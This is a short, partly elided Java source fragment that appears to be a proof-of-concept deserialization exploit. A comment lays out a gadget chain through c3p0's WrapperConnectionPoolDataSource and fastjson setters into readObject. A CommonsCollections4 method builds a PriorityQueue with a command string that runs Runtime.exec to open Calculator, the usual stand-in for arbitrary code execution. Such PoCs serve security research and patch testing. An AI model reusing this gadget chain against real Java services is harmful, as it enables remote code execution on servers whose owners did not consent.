...
/*
	Gadget chain:
	    com.mchange.v2.c3p0.WrapperConnectionPoolDataSource.setUpPropertyListeners() -> constructor executed first
	        (listen: connectionTesterClassName, userOverridesAsString)
 ...
 */
/*
    fastjson-setter -> readObject()
 */
public class c3p0_fastjson_cc4_temp {
    ...
    public static PriorityQueue CommonsCollections4() throws Exception {
        ...
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\");";
